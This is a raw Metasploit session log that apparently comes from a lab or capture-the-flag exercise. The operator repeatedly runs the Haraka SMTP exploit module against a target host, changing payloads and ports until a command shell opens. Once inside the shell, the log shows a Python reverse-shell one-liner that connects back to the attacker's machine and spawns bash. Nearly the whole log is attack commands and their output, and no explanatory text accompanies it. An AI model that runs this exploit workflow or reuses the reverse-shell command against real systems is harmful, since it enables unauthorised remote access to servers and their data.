+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/ewmoCo7LUp
+[*] Sending mail to target server...
+[-] Bug not triggered in target server
+[-] it may not be vulnerable or have the attachment plugin activated
+[*] Command Stager progress - 100.00% done (116/116 bytes)
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/KC1HMNfl6L
+[*] Sending mail to target server...
+[-] Bug not triggered in target server
+[-] it may not be vulnerable or have the attachment plugin activated
+[*] Command Stager progress - 100.00% done (116/116 bytes)
+^[[A^[[B^[[B^[[A
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/u5rhtzTso
+[*] Sending mail to target server...
+[-] Bug not triggered in target server
+[-] it may not be vulnerable or have the attachment plugin activated
+[*] Command Stager progress - 100.00% done (115/115 bytes)
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/
+set payload linux/x64/exec                        set payload linux/x64/meterpreter_reverse_tcp     set payload linux/x64/shell_bind_ipv6_tcp
+set payload linux/x64/meterpreter/bind_tcp        set payload linux/x64/pingback_bind_tcp           set payload linux/x64/shell_bind_tcp
+set payload linux/x64/meterpreter/reverse_tcp     set payload linux/x64/pingback_reverse_tcp        set payload linux/x64/shell_bind_tcp_random_port
+set payload linux/x64/meterpreter_reverse_http    set payload linux/x64/shell/bind_tcp              set payload linux/x64/shell_reverse_ipv6_tcp
+set payload linux/x64/meterpreter_reverse_https   set payload linux/x64/shell/reverse_tcp           set payload linux/x64/shell_reverse_tcp
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/shell_reverse_tcp 
+payload => linux/x64/shell_reverse_tcp
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8001             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    root@harakiri    yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       25               yes       Target server port
+
+
+Payload options (linux/x64/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.19.40    yes       The listen address (an interface may be specified)
+   LPORT  80               yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > set LPORT 4242
+LPORT => 4242
+msf5 exploit(linux/smtp/haraka) > run
+
+[-] Handler failed to bind to 192.168.19.40:4242:-  -
+[-] Handler failed to bind to 0.0.0.0:4242:-  -
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4242).
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Started reverse TCP handler on 192.168.19.40:4242 
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/EaG4OuhIWsTLj
+[*] Sending mail to target server...
+[-] Bug not triggered in target server
+[-] it may not be vulnerable or have the attachment plugin activated
+[*] Command Stager progress - 100.00% done (119/119 bytes)
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/
+set payload linux/x64/exec                        set payload linux/x64/meterpreter_reverse_tcp     set payload linux/x64/shell_bind_ipv6_tcp
+set payload linux/x64/meterpreter/bind_tcp        set payload linux/x64/pingback_bind_tcp           set payload linux/x64/shell_bind_tcp
+set payload linux/x64/meterpreter/reverse_tcp     set payload linux/x64/pingback_reverse_tcp        set payload linux/x64/shell_bind_tcp_random_port
+set payload linux/x64/meterpreter_reverse_http    set payload linux/x64/shell/bind_tcp              set payload linux/x64/shell_reverse_ipv6_tcp
+set payload linux/x64/meterpreter_reverse_https   set payload linux/x64/shell/reverse_tcp           set payload linux/x64/shell_reverse_tcp
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/shell
+set payload linux/x64/shell/bind_tcp              set payload linux/x64/shell_bind_tcp              set payload linux/x64/shell_reverse_tcp
+set payload linux/x64/shell/reverse_tcp           set payload linux/x64/shell_bind_tcp_random_port  
+set payload linux/x64/shell_bind_ipv6_tcp         set payload linux/x64/shell_reverse_ipv6_tcp      
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/shell_bind_tcp
+payload => linux/x64/shell_bind_tcp
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8001             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    root@harakiri    yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       25               yes       Target server port
+
+
+Payload options (linux/x64/shell_bind_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LPORT  4242             yes       The listen port
+   RHOST  192.168.40.81    no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/shell_bind_tcp
+payload => linux/x64/shell_bind_tcp
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/wOqth8MIf
+[*] Sending mail to target server...
+[-] Bug not triggered in target server
+[-] it may not be vulnerable or have the attachment plugin activated
+[*] Command Stager progress - 100.00% done (115/115 bytes)
+[*] Started bind TCP handler against 192.168.40.81:4242
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set rport 5555
+rport => 5555
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/F5XLXTCithBjG
+[*] Sending mail to target server...
+[*] Client 192.168.40.81 (Wget/1.17.1 (linux-gnu)) requested /F5XLXTCithBjG
+[*] Sending payload to 192.168.40.81 (Wget/1.17.1 (linux-gnu))
+[+] Triggered bug in target server (plugin timeout)
+[*] Command Stager progress - 100.00% done (119/119 bytes)
+[*] Started bind TCP handler against 192.168.40.81:4242
+[*] Command shell session 1 opened (192.168.19.40:43947 -> 192.168.40.81:4242) at 2020-04-27 10:52:08 -0400
+[*] Server stopped.
+
+dir
+bin   home            lib64       opt   sbin  tmp      vmlinuz.old
+boot  initrd.img      lost+found  proc  snap  usr
+dev   initrd.img.old  media       root  srv   var
+etc   lib             mnt         run   sys   vmlinuz
+which python
+/usr/bin/python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.19.40",4243));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
